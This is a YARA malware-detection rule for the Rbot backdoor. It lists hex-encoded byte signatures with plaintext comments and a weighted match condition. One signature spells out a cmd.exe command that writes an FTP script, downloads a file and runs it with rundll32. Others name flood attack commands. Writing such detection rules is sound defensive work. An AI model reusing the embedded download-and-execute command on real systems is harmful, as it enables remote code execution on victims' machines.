
rule Backdoor_Win32_Rbot_gen_C{
	meta:
		description = "Backdoor:Win32/Rbot.gen!C,SIGNATURE_TYPE_PEHSTR_EXT,12 00 11 00 0c 00 00 "
		
	strings :
		$a_01_0 = {63 6d 64 2e 65 78 65 20 2f 43 20 65 63 68 6f 20 6f 70 65 6e 20 25 73 20 25 68 75 3e 78 26 65 63 68 6f 20 75 73 65 72 20 61 73 6e 20 78 3e 3e 78 26 65 63 68 6f 20 62 69 6e 3e 3e 78 26 65 63 68 6f 20 67 65 74 20 25 73 3e 3e 78 26 65 63 68 6f 20 62 79 65 3e 3e 78 26 64 65 6c 20 78 26 66 74 70 2e 65 78 65 20 2d 6e 20 2d 73 3a 78 26 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 25 73 2c 73 74 61 72 74 } //3 cmd.exe /C echo open %s %hu>x&echo user asn x>>x&echo bin>>x&echo get %s>>x&echo bye>>x&del x&ftp.exe -n -s:x&rundll32.exe %s,start
		$a_00_1 = {50 43 20 4e 45 54 57 4f 52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 } //3 PC NETWORK PROGRAM 1.0
		$a_01_2 = {4c 41 4e 4d 41 4e 31 2e 30 } //3 LANMAN1.0
		$a_01_3 = {6c 6f 63 61 6c 20 69 70 3a 20 25 73 2c 20 67 6c 6f 62 61 6c 20 69 70 3a 20 25 73 } //3 local ip: %s, global ip: %s
		$a_01_4 = {50 41 53 53 } //1 PASS
		$a_01_5 = {50 4f 52 54 } //1 PORT
		$a_01_6 = {28 44 45 42 55 47 29 20 44 6f 77 6e 6c 6f 61 64 20 63 61 75 73 65 64 20 63 72 61 73 68 21 } //1 (DEBUG) Download caused crash!
		$a_00_7 = {69 63 6d 70 66 6c 6f 6f 64 } //1 icmpflood
		$a_01_8 = {75 64 70 66 6c 6f 6f 64 } //1 udpflood
		$a_01_9 = {73 79 6e 66 6c 6f 6f 64 } //1 synflood
		$a_01_10 = {73 70 61 7a 66 6c 6f 6f 64 } //1 spazflood
		$a_01_11 = {72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 25 73 2c 73 74 61 72 74 } //1 rundll32.exe %s,start
	condition:
		((#a_01_0  & 1)*3+(#a_00_1  & 1)*3+(#a_01_2  & 1)*3+(#a_01_3  & 1)*3+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_00_7  & 1)*1+(#a_01_8  & 1)*1+(#a_01_9  & 1)*1+(#a_01_10  & 1)*1+(#a_01_11  & 1)*1) >=17
 
}